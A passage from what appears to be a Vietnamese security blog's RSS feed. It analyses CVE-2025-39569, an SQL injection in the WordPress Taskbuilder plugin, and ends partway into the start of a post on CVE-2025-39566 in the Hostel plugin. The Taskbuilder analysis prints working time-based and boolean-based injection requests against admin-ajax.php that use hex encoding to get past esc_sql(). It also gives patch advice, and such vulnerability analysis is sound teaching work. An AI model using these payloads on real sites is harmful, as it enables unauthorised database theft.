WordPress&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;WPPM_Admin construct&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;final class WPPM_Admin {&#xA;    // constructor&#xA;    public function __construct() {&#xA;&#xA;        // other action&#xA;&#xA;        add_action( &amp;#39;wp_ajax_wppm_get_users&amp;#39;,array($this,&amp;#39;wppm_get_users&amp;#39;));&#xA;&#xA;        // array($this,&amp;#39;wppm_get_users&amp;#39;)) = $this::wppm_get_users()&#xA;        // other action&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;add_action()&lt;/code&gt; l√† m·ªôt &lt;strong&gt;Plugin API&lt;/strong&gt; c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt &lt;strong&gt;callback&lt;/strong&gt; v√†o m·ªôt &lt;strong&gt;action hook&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_ajax_wppm_get_users&lt;/code&gt; l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_{action}&lt;/code&gt; =&amp;gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_{action}&lt;/code&gt; =&amp;gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y, &lt;code&gt;action = wppm_get_users&lt;/code&gt;. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i &lt;code&gt;action=wppm_get_users&lt;/code&gt; t·ªõi &lt;code&gt;admin-ajax.php&lt;/code&gt;, th√¨ WordPress s·∫Ω &lt;strong&gt;t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω&lt;/strong&gt;, ·ªü ƒë√¢y l√† &lt;code&gt;wppm_get_users()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c &lt;code&gt;action = wppm_get_users&lt;/code&gt;, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a &lt;code&gt;wppm_get_users&lt;/code&gt; tr√™n c√°c file &lt;strong&gt;.js&lt;/strong&gt; trong th∆∞ m·ª•c ch·ª©a plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_search.png&#34;&#xA;    alt=&#34;ajax search&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ajax search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Action &lt;code&gt;wppm_get_users&lt;/code&gt; l√† ph·∫ßn data trong request POST c·ªßa h√†m &lt;code&gt;wppm_get_users()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;wppm_get_users()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa &lt;strong&gt;ch·ª©c nƒÉng project&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;T·∫°o project m·ªõi&lt;/li&gt;&#xA;&lt;li&gt;Truy c·∫≠p v√†o project ƒë√≥&lt;/li&gt;&#xA;&lt;li&gt;Inspect code v√† t√¨m h√†m &lt;code&gt;wppm_get_users&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/ajax_inspect.png&#34;&#xA;    alt=&#34;ajax inspect&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ajax inspect&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Khi click v√†o &lt;strong&gt;icon b√™n c·∫°nh Users&lt;/strong&gt; ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/model_display.png&#34;&#xA;    alt=&#34;model display&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Model display&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload &lt;strong&gt;time base&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;SLEEP(1))&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/sqli_success.png&#34;&#xA;    alt=&#34;sqli success&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Sqli success&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =&amp;gt; SQL Injection th√†nh c√¥ng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ &lt;strong&gt;dump ƒë∆∞·ª£c h·∫øt data&lt;/strong&gt; l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi SQLi payload &lt;strong&gt;boolean base&lt;/strong&gt; v√≥i &lt;code&gt;proj_id&lt;/code&gt; ƒë√∫ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† &lt;strong&gt;wordpress&lt;/strong&gt; n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† &lt;code&gt;w&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† &lt;code&gt;0x77&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng &lt;code&gt;SUBSTRING(STRING,1,1)&lt;/code&gt; ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y, &lt;code&gt;$proj_id&lt;/code&gt; b·∫±ng &lt;code&gt;4&lt;/code&gt; v√¨ &lt;code&gt;SUBSTRING(&#39;wordpress&#39;,1,1)=0x77&lt;/code&gt; l√† ƒë√∫ng n√™n &lt;code&gt;SELECT&lt;/code&gt; l·∫•y gi√° tr·ªã ƒë√∫ng trong &lt;code&gt;IF(condition, value if true, value if false)&lt;/code&gt;, &lt;code&gt;4&lt;/code&gt; l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res.png&#34;&#xA;    alt=&#34;response 1&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Res 1&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;S·ª≠ d·ª•ng &lt;strong&gt;HEX technique&lt;/strong&gt; ƒë·ªÉ bypass h√†m &lt;code&gt;esc_sql()&lt;/code&gt; &lt;a href=&#34;#patch-diff&#34;&gt;·ªü tr√™n&lt;/a&gt;, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c &lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request v·ªõi SQLi payload &lt;strong&gt;boolean base&lt;/strong&gt; v√≥i &lt;code&gt;proj_id&lt;/code&gt; sai:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;...&#xA;action=wppm_get_users&amp;amp;proj_id=(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;V·ªõi &lt;code&gt;proj_id&lt;/code&gt; kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a &lt;code&gt;None&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-22-cve-2025-39569/res_none.png&#34;&#xA;    alt=&#34;response 2&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Res 2&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t &lt;strong&gt;boolean base&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;proj_id&lt;/code&gt; ƒë√πng: response kh√¥ng ch·ª©a None&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;proj_id&lt;/code&gt; sai: response ch·ª©a None&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t &lt;strong&gt;time base&lt;/strong&gt; nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-39569&lt;/strong&gt; trong plugin &lt;strong&gt;WordPress Taskbuilder&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n &lt;code&gt;&#39;...&#39;&lt;/code&gt; bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ·ªü phi√™n b·∫£n &lt;strong&gt;4.0.2&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a &lt;code&gt;$proj_id&lt;/code&gt; v√†o trong &lt;code&gt;&#39;...&#39;&lt;/code&gt;, ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;∆Øu ti√™n s·ª≠ d·ª•ng &lt;strong&gt;prepared statements&lt;/strong&gt; (&lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng &lt;strong&gt;c√°c Ajax endpoint&lt;/strong&gt; v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Taskbuilder project mnagement tool Plugin &amp;lt;= 4.0.1 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39566 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-09-21-cve-2025-39566/</link>
      <pubDate>Sun, 21 Sep 2025 22:27:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-09-21-cve-2025-39566/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng trong plugin &lt;strong&gt;Hostel&lt;/strong&gt; tr∆∞·ªõc phi√™n b·∫£n &lt;strong&gt;1.1.5.7&lt;/strong&gt;. Do d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm nh∆∞ng kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp d·ªØ li·ªáu.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39566&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39566&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.6 (High)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë &lt;code&gt;ob&lt;/code&gt; trong ph·∫ßn &lt;strong&gt;Manage Bookings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;background&#34;&gt;&lt;span&gt;Background&lt;/span&gt;&#xA;  &lt;a href=&#34;#background&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt; cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Form ƒë·∫∑t ph√≤ng&lt;/li&gt;&#xA;&lt;li&gt;L·ªãch ph√≤ng&lt;/li&gt;&#xA;&lt;li&gt;Qu·∫£n l√Ω bookings&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploitation&#34;&gt;&lt;span&gt;Exploitation&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploitation&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;:  v1.1.5.6(vul) v√† v1.1.5.7(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 